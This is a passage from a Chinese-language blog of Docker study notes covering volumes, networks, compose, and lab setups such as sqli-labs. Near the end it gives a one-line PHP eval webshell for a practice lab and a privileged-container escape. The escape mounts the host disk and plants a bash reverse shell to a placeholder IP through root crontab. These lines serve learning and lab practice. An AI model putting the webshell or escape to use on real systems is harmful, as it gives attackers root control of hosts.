<code>数据卷</code>。</p>\n<p>下面创建一个名为 <code>web</code> 的容器，并加载一个 <code>数据卷</code> 到容器的 <code>/usr/share/nginx/html</code> 目录。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker run -d -P \\\n    --name web \\\n    \\# -v my-vol:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\\n    --mount source&#x3D;my-vol,target&#x3D;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html \\\n    nginx:alpine</code></pre>\n\n<h4 id=\"查看数据卷的具体信息\"><a href=\"#查看数据卷的具体信息\" class=\"headerlink\" title=\"查看数据卷的具体信息\"></a>查看数据卷的具体信息</h4><p>在主机里使用以下命令可以查看 <code>web</code> 容器的信息</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker inspect web</code></pre>\n\n<p><code>数据卷</code> 信息在 “Mounts” Key 下面</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">&quot;Mounts&quot;: [\n    &#123;\n        &quot;Type&quot;: &quot;volume&quot;,\n        &quot;Name&quot;: &quot;my-vol&quot;,\n        &quot;Source&quot;: &quot;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;my-vol&#x2F;_data&quot;,\n        &quot;Destination&quot;: &quot;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&quot;,\n        &quot;Driver&quot;: &quot;local&quot;,\n        &quot;Mode&quot;: &quot;&quot;,\n        &quot;RW&quot;: true,\n        &quot;Propagation&quot;: &quot;&quot;\n   &#125;\n],</code></pre>\n\n<h4 id=\"删除数据卷\"><a href=\"#删除数据卷\" class=\"headerlink\" title=\"删除数据卷\"></a>删除数据卷</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker volume rm my-vol</code></pre>\n\n<p><code>数据卷</code> 是被设计用来持久化数据的，它的生命周期独立于容器，Docker 不会在容器被删除后自动删除 <code>数据卷</code>，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的 <code>数据卷</code>。如果需要在删除容器的同时移除数据卷。可以在删除容器的时候使用 <code>docker rm -v</code> 这个命令。</p>\n<p>无主的数据卷可能会占据很多空间，要清理请使用以下命令</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker volume prune</code></pre>\n\n<h3 id=\"挂载卷\"><a href=\"#挂载卷\" class=\"headerlink\" title=\"挂载卷\"></a>挂载卷</h3><p>看下面的这个案例理解一下就明白了：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker run -d -p 9088:80 --name wordpress_phpmyadmin -v &quot;&#96;pwd&#96;&#x2F;mysql&quot;:&#x2F;var&#x2F;lib&#x2F;mysql&#x2F; -v &quot;&#96;pwd&#96;&#x2F;app&quot;:&#x2F;app&#x2F; wordpress_phpmyadmin:latest</code></pre>\n\n<h3 id=\"复制文件\"><a href=\"#复制文件\" class=\"headerlink\" title=\"复制文件\"></a>复制文件</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"># 物理机拷贝到容器\ndocker cp test.txt 容器ID:&#x2F;var&#x2F;www&#x2F;html\n\n# 容器拷贝到物理机\ndocker cp 容器ID:&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt 物理机路径</code></pre>\n\n<h3 id=\"新建网络\"><a href=\"#新建网络\" class=\"headerlink\" title=\"新建网络\"></a>新建网络</h3><p>下面先创建一个新的 Docker 网络。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker network create -d bridge my-net</code></pre>\n\n<p><code>-d</code> 参数指定 Docker 网络类型，有 <code>bridge</code> <code>overlay</code>。其中 <code>overlay</code> 网络类型用于 <a href=\"\">Swarm mode</a>，在本小节中你可以忽略它。</p>\n<h4 id=\"连接容器-1\"><a href=\"#连接容器-1\" class=\"headerlink\" title=\"连接容器\"></a>连接容器</h4><p>运行一个容器并连接到新建的 <code>test-net</code> 网络</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker run -it --rm --name test1 --network test-net centos:7 sh</code></pre>\n\n<p>打开新的终端，再运行一个容器并加入到 <code>test-net</code> 网络</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker run -it --rm --name test2 --network test-net centos:7 sh</code></pre>\n\n<p>下面通过 <code>ping</code> 来证明 <code>test1</code> 容器和 <code>test2</code> 容器建立了互联关系。</p>\n<p>在 <code>test1</code> 容器输入以下命令</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">&#x2F; # ping test2\nPING test2 (172.19.0.3): 56 data bytes\n64 bytes from 172.19.0.3: seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.072 ms\n64 bytes from 172.19.0.3: seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.118 ms</code></pre>\n\n<p>用 ping 来测试连接 <code>test2</code> 容器，它会解析成 <code>172.19.0.3</code>。</p>\n<p>同理在 <code>test2</code> 容器执行 <code>ping test1</code>，也会成功连接到。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">&#x2F; # ping test1\nPING test1 (172.19.0.2): 56 data bytes\n64 bytes from 172.19.0.2: seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.064 ms\n64 bytes from 172.19.0.2: seq&#x3D;1 ttl&#x3D;64 time&#x3D;0.143 ms</code></pre>\n\n<p>这样，<code>test1</code> 容器和 <code>test2</code> 容器建立了互联关系。</p>\n<h3 id=\"Docker-compose\"><a href=\"#Docker-compose\" class=\"headerlink\" title=\"Docker compose\"></a>Docker compose</h3><p>docker compose 神器，国内的 vulhubs 靶场就是用的 docker compose 规范，所以这里有必要安装一下。<br>首先来查看最新版本 <a href=\"https://github.com/docker/compose/releases\">https://github.com/docker/compose/releases</a></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"># 下载docker-compose\ncurl -L https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.25.0-rc2&#x2F;docker-compose-&#96;uname -s&#96;-&#96;uname -m&#96; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose\n\n# 给docker-compose执行权限\nchmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose\n\n# 查看docker compose版本\nroot@kali-linux:~# docker-compose  version\ndocker-compose version 1.25.0-rc2, build 661ac20e\ndocker-py version: 4.0.1\nCPython version: 3.7.4\nOpenSSL version: OpenSSL 1.1.0k  28 May 2019</code></pre>\n\n<h2 id=\"一些小Tips\"><a href=\"#一些小Tips\" class=\"headerlink\" title=\"一些小Tips\"></a>一些小Tips</h2><h3 id=\"如何确认是在docker容器中？\"><a href=\"#如何确认是在docker容器中？\" class=\"headerlink\" title=\"如何确认是在docker容器中？\"></a>如何确认是在docker容器中？</h3><h4 id=\"方法一：检查根目录下是否存在-dockerenv文件\"><a href=\"#方法一：检查根目录下是否存在-dockerenv文件\" class=\"headerlink\" title=\"方法一：检查根目录下是否存在.dockerenv文件\"></a>方法一：检查根目录下是否存在.dockerenv文件</h4><p>如果根目录下存在.dockerenv文件，说明是在docker容器中。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">ls -al &#x2F;</code></pre>\n\n<h4 id=\"方法二：检查-x2F-proc-x2F-1-x2F-cgroup-是否存在含有docker字符串\"><a href=\"#方法二：检查-x2F-proc-x2F-1-x2F-cgroup-是否存在含有docker字符串\" class=\"headerlink\" title=\"方法二：检查 &#x2F;proc&#x2F;1&#x2F;cgroup 是否存在含有docker字符串\"></a>方法二：检查 &#x2F;proc&#x2F;1&#x2F;cgroup 是否存在含有docker字符串</h4><p>查询系统进程的cgroup信息，存在docker字段则是在docker容器中。</p>\n<h2 id=\"实践项目\"><a href=\"#实践项目\" class=\"headerlink\" title=\"实践项目\"></a>实践项目</h2><h3 id=\"Docker搭建-sqli-labs-环境\"><a href=\"#Docker搭建-sqli-labs-环境\" class=\"headerlink\" title=\"Docker搭建 sqli-labs 环境\"></a>Docker搭建 sqli-labs 环境</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker pull acgpiano&#x2F;sqli-labs\ndocker run --name sqli-labs -d -p 8080:80 acgpiano&#x2F;sqli-labs\ndocker exec -it ID &#x2F;bin&#x2F;bash</code></pre>\n\n<ul>\n<li>MySQL 默认密码为 空</li>\n<li>浏览器访问：127.0.0.1:8080</li>\n<li>初始化数据库先</li>\n</ul>\n<h3 id=\"Docker-搭建-Portainer-图形管理工具\"><a href=\"#Docker-搭建-Portainer-图形管理工具\" class=\"headerlink\" title=\"Docker 搭建 Portainer 图形管理工具\"></a>Docker 搭建 Portainer 图形管理工具</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker search portainer\n$ docker pull portainer&#x2F;portainer\n$ docker run -d -p 9000:9000 --restart&#x3D;always -v  &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock --name portainer portainer&#x2F;portainer</code></pre>\n\n<h3 id=\"Docker-搭建宝塔面板注意事项\"><a href=\"#Docker-搭建宝塔面板注意事项\" class=\"headerlink\" title=\"Docker 搭建宝塔面板注意事项\"></a>Docker 搭建宝塔面板注意事项</h3><p>centos7 镜像，做好端口映射<br>8080:88 888:888 8888:8888 8081:80<br>每次重启的时候得手动启动服务:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ &#x2F;etc&#x2F;init.d&#x2F;bt start\n$ &#x2F;etc&#x2F;init.d&#x2F;mysqld start\n$ &#x2F;etc&#x2F;init.d&#x2F;nginx start\n$ &#x2F;etc&#x2F;init.d&#x2F;php-fpm-54 start\n$ &#x2F;etc&#x2F;init.d&#x2F;php-fpm-73 start</code></pre>\n\n<h3 id=\"Docker-搭建Answer\"><a href=\"#Docker-搭建Answer\" class=\"headerlink\" title=\"Docker 搭建Answer\"></a>Docker 搭建Answer</h3><p>Answer是一个类似知乎的开源问答社区。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">https:&#x2F;&#x2F;github.com&#x2F;answerdev&#x2F;answer</code></pre>\n\n<h3 id=\"Docker-compose-1\"><a href=\"#Docker-compose-1\" class=\"headerlink\" title=\"Docker compose\"></a>Docker compose</h3><p>练习使用docker-compose组建含有3个容器的服务，这三个容器由php:7.2-apache镜像构成，并且在三个容器中，Web目录下有一个名为index.php的Webshell，内容为 :</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></pre>\n\n<p>三个容器container_a、container_b、container_c，ab所在网络为network1，bc所在网络为network2。</p>\n<h3 id=\"Docker逃逸\"><a href=\"#Docker逃逸\" class=\"headerlink\" title=\"Docker逃逸\"></a>Docker逃逸</h3><p>特权模式逃逸是一种最简单有效的逃逸方法，使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，可直接通过chroot切换根目录、写ssh公钥和crontab计划任何等逃逸到宿主机。</p>\n<h4 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h4><p>拉取一个镜像，在启用时使用–privileged</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker pull ubuntu:16.04 docker run -itd --privileged ubuntu:16.04 &#x2F;bin&#x2F;bash</code></pre>\n\n<h4 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h4><p>判断是否是特权模式启动，如果是以特权模式启动的话，CapEff对应的掩码值应该为0000003fffffffff</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">cat &#x2F;proc&#x2F;self&#x2F;status | grep Cap</code></pre>\n\n<h4 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h4><p>在docker容器中查看系统磁盘分区情况，在新建一个目录，将宿主机所在磁盘挂载到新建的目录中。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">fdisk -l\nmkdir &#x2F;hacker\nmount &#x2F;dev&#x2F;sda5 &#x2F;hacker</code></pre>\n\n<p>进入到hacker目录,通过touch创建一个sh文件，再将bash反弹命令写入到创建的sh文件里面，在编写计划任务到&#x2F;hacker&#x2F;etc&#x2F;crontab文件中。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">touch &#x2F;hacker&#x2F;hacker.sh\necho &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;12580 0&gt;&amp;1&quot; &gt;&#x2F;hacker&#x2F;hacker.sh\necho &quot;* * * * * root bash &#x2F;hacker.sh&quot; &gt;&gt; &#x2F;hacker&#x2F;etc&#x2F;crontab</code></pre>\n\n\n\n\n\n<p>补充</p>\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606090349008.png\" alt=\"image-20230606090349008\"></p>\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606090551223.png\" alt=\"image-20230606090551223\"></p>\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606090756416.png\" alt=\"image-20230606090756416\"></p>\n<p>Ubuntu一键部署</p>\n<p><code>curl -fsSL get.docker.com -o get-docker.sh</code></p>\n<p><code>sudo sh get-docker.sh --mirror Aliyun</code></p>\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606091305529.png\" alt=\"image-20230606091305529\"></p>\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606092319336.png\" alt=\"image-20230606092319336\"></p>\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606093834270.png\" alt=\"image-20230606093834270\"></p>\n<p><code>sudo docker run -it --name test2 ubuntu:18.04 /bin/bash</code></p>\n<p><code>sudo docker exec -it test2 bash</code></p>\n<p><code>sudo docker rm -f test1</code>   # 开着的时候也能强制删除</p>\n<p><code>sudo docker start test1</code></p>\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606104323024.png\" alt=\"image-20230606104323024\"></p>\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606104509823.png\" alt=\"image-20230606104509823\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">一键停止所有容器\n&#96;docker stop $(docker ps -aq)&#96;\n\n一键删除所有容器\n\ndocker rm -f &#96;docker ps -a&#96;\n\n删除所有镜像\ndocker rmi $(docker images -q)\n\nDocker系统统计信息\ndocker stats</code></pre>\n\n<p><img src=\"C:\\Users\\Abyssaler\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230606160300015.png\" alt=\"image-20230606160300015\"></p>\n","feature":true,"text":"Docker 是基于 Go 语言实现的云开源项目，是基于 Linux 的多项开源技术提供高效、敏捷和轻量级的容器方案。创建于 2013 年初，自从开源后就受到了广泛的关注，从长远的眼光来看，Docker 是未来虚拟化的一个发展的趋势。带来了更轻量快捷的的体验，一台主机可以同时运行...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":28,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"kls","slug":"kls","count":15,"path":"api/tags/kls.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">Docker简介</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BC%98%E5%8A%BF\"><span class=\"toc-text\">优势</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E6%9C%AC%E7%BB%84%E4%BB%B6\"><span class=\"toc-text\">基本组件</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker-%E5%AE%89%E8%A3%85\"><span class=\"toc-text\">Docker 安装</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Ubuntu-x2F-CentOS-%E5%AE%89%E8%A3%85-Docker\"><span class=\"toc-text\">Ubuntu&#x2F;CentOS 安装 Docker</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Dokcer-%E5%85%A5%E9%97%A8\"><span class=\"toc-text\">Dokcer 入门</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%90%9C%E7%B4%A2%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">搜索镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">下载镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%97%E5%87%BA%E4%B8%8B%E8%BD%BD%E7%9A%84%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">列出下载的镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%9B%E5%BB%BA%E5%B9%B6%E4%BD%BF%E7%94%A8%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">创建并使用容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%80%80%E5%87%BA%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">退出容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%AE%B9%E5%99%A8%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">查看容器列表</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-start-%E5%91%BD%E4%BB%A4%E6%9D%A5%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">使用 start 命令来启动容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-restart-%E5%91%BD%E4%BB%A4%E6%9D%A5%E9%87%8D%E5%90%AF%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">使用 restart 命令来重启容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-attach-%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">使用 attach 命令连接容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Docker-%E7%B3%BB%E7%BB%9F%E7%BB%9F%E8%AE%A1%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">Docker 系统统计信息</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%88%E6%AD%A2%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">终止容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">删除容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">删除镜像</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker-%E7%AE%80%E7%BA%A6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">Docker 简约命令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%97%E5%87%BA%E4%B8%8B%E8%BD%BD%E7%9A%84%E9%95%9C%E5%83%8F-1\"><span class=\"toc-text\">列出下载的镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%83%A8%E7%BD%B2%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">部署容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%9B%E5%BB%BA%E5%B9%B6%E4%BD%BF%E7%94%A8%E5%AE%B9%E5%99%A8-1\"><span class=\"toc-text\">创建并使用容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%AE%B9%E5%99%A8%E5%88%97%E8%A1%A8-1\"><span class=\"toc-text\">查看容器列表</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-start-%E5%91%BD%E4%BB%A4%E6%9D%A5%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8-1\"><span class=\"toc-text\">使用 start 命令来启动容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-restart-%E5%91%BD%E4%BB%A4%E6%9D%A5%E9%87%8D%E5%90%AF%E5%AE%B9%E5%99%A8-1\"><span class=\"toc-text\">使用 restart 命令来重启容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8-attach-%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E5%AE%B9%E5%99%A8-1\"><span class=\"toc-text\">使用 attach 命令连接容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Docker-%E7%B3%BB%E7%BB%9F%E7%BB%9F%E8%AE%A1%E4%BF%A1%E6%81%AF-1\"><span class=\"toc-text\">Docker 系统统计信息</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%88%E6%AD%A2%E5%AE%B9%E5%99%A8-1\"><span class=\"toc-text\">终止容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E5%AE%B9%E5%99%A8-1\"><span class=\"toc-text\">删除容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E9%95%9C%E5%83%8F-1\"><span class=\"toc-text\">删除镜像</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84-Kali\"><span class=\"toc-text\">打造属于你自己的 Kali</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A6%96%E5%85%88%E6%90%9C%E7%B4%A2%E4%B8%8B%E5%8F%AF%E7%94%A8%E7%9A%84-Kali-%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">首先搜索下可用的 Kali 镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%8B%E8%BD%BD-Kali-%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">下载 Kali 镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%9B%E5%BB%BA-Kali-%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">创建 Kali 容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%9B%E5%85%A5%E5%AE%B9%E5%99%A8%E6%9F%A5%E7%9C%8B%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">进入容器查看基本信息</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%89%E8%A3%85%E8%87%AA%E5%B7%B1%E9%9C%80%E8%A6%81%E7%9A%84%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">安装自己需要的工具</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker-%E4%BC%98%E5%8C%96\"><span class=\"toc-text\">Docker 优化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Docker-%E5%9B%BD%E5%86%85%E5%8A%A0%E9%80%9F%E5%99%A8\"><span class=\"toc-text\">Docker 国内加速器</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">Docker 基础命令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%90%9C%E7%B4%A2%E9%95%9C%E5%83%8F-1\"><span class=\"toc-text\">搜索镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F-1\"><span class=\"toc-text\">下载镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%B7%B2%E4%B8%8B%E8%BD%BD%E7%9A%84%E9%95%9C%E5%83%8F%E5%88%97%E8%A1%A8\"><span class=\"toc-text\">查看已下载的镜像列表</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%9B%E5%BB%BA%E5%B9%B6%E4%BD%BF%E7%94%A8%E5%AE%B9%E5%99%A8-2\"><span class=\"toc-text\">创建并使用容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">查看当前容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%9F%E8%AE%A1%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">统计信息</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">启动容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%87%8D%E5%90%AF%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">重启容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%88%E6%AD%A2%E5%AE%B9%E5%99%A8-2\"><span class=\"toc-text\">终止容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%88%E6%AD%A2%E6%89%80%E6%9C%89%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">终止所有容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%9E%E6%8E%A5%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">连接容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E5%AE%B9%E5%99%A8-2\"><span class=\"toc-text\">删除容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E5%AE%B9%E5%99%A8\"><span class=\"toc-text\">删除所有容器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E9%95%9C%E5%83%8F-2\"><span class=\"toc-text\">删除镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">删除所有镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84\"><span class=\"toc-text\">端口映射</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#dockerfile-%E9%83%A8%E7%BD%B2%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">dockerfile 部署镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#docker-compose-%E9%83%A8%E7%BD%B2\"><span class=\"toc-text\">docker-compose 部署</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9E%84%E5%BB%BA%E6%96%B0%E7%9A%84%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">构建新的镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%9D%E5%AD%98%E7%A6%BB%E7%BA%BF%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">保存离线镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AF%BC%E5%85%A5%E7%A6%BB%E7%BA%BF%E9%95%9C%E5%83%8F\"><span class=\"toc-text\">导入离线镜像</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%95%B0%E6%8D%AE%E5%8D%B7\"><span 